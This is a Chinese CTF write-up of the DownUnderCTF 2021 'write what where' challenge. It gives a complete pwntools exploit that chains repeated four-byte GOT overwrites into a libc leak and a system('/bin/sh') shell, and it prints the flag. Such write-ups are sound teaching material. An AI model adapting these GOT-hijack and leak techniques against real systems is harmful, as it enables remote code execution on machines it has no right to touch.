# DownUnderCTF 2021 - write what where

## 题目简述

程序读取恰好四字节 `what` 和一个十进制地址 `where`，随后执行 `*(int *)where = *(int *)what`，提供一次四字节任意地址写。二进制关闭 PIE 且 GOT 可写，但没有现成的信息泄露；需要先把单次写扩展为重复写，再把初始化函数改造成泄露与命令执行入口。

## 解题过程

原语本身非常直接：

```c
read(0, what, 4);
read(0, where_buf, 9);
where = atoi(where_buf);
*(int *)where = *(int *)what;
exit(0);
```

第一笔把 `exit@got` 改为 `main+33`。程序末尾调用 `exit` 时便重新进入跳过 `init` 的主循环，再获得一笔写；之后每次写完都会再次经过被劫持的 `exit`，因此四字节任意写可以无限重复。

```python
from pwn import ELF, p32, p64, remote, u64

elf = ELF("./write-what-where", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote(HOST, PORT)

def write4(value, address):
    io.sendafter(b"what?\n", value)
    io.sendlineafter(b"where?\n", str(address).encode())

write4(p32(elf.sym.main + 33), elf.got.exit)
```

### 构造 libc 泄露

`init` 原本调用 `setvbuf(stdin, ...)`。先把二进制中的全局 `stdin` 指针改成 `puts@got`，再把 `setvbuf@got` 改成 `puts@plt`；由于目标都是 64 位值，每个值拆成低、高两个四字节写入。最后把 `exit@got` 改回 `main`，使下一轮从函数开头执行 `init`。原调用随即等价于 `puts(puts@got)`，输出 GOT 中的真实 libc 地址。

```python
# stdin = &puts@got
write4(p32(elf.got.puts), elf.sym.stdin)
write4(p32(0), elf.sym.stdin + 4)

# setvbuf@got = puts@plt
write4(p32(elf.plt.puts), elf.got.setvbuf)
write4(p32(0), elf.got.setvbuf + 4)

write4(p32(elf.sym.main), elf.got.exit)
puts_addr = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = puts_addr - 0x809D0
```

### 把初始化调用改成 `system`

泄露后再次令 `exit@got = main+33` 恢复重复写。把 `stdin` 的值换成提供 libc 中 `/bin/sh` 的地址，把 `setvbuf@got` 换成 `system`，最后再次让 `exit` 回到完整 `main`。进入 `init` 后，原来的第一条 `setvbuf(stdin, ...)` 调用就变成 `system("/bin/sh")`。

```python
write4(p32(elf.sym.main + 33), elf.got.exit)

bin_sh = libc.address + 0x1ABF05
system = libc.sym.system

write4(p64(bin_sh)[:4], elf.sym.stdin)
write4(p64(bin_sh)[4:], elf.sym.stdin + 4)
write4(p64(system)[:4], elf.got.setvbuf)
write4(p64(system)[4:], elf.got.setvbuf + 4)

write4(p32(elf.sym.main), elf.got.exit)
io.sendline(b"cat flag.txt")
print(io.recvuntil(b"}").decode(errors="ignore"))
```

最终得到：

```text
DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
```

## 方法总结

一次任意写的首要问题是“如何获得下一次写”。覆盖退出路径回到输入循环后，GOT 与全局指针就能组合出新的调用语义：先让 `setvbuf(stdin,...)` 变成 `puts(puts@got)` 泄露 libc，再变成 `system("/bin/sh")`。四字节原语操作 64 位地址时必须分两次写，并注意高四字节与调用触发顺序。
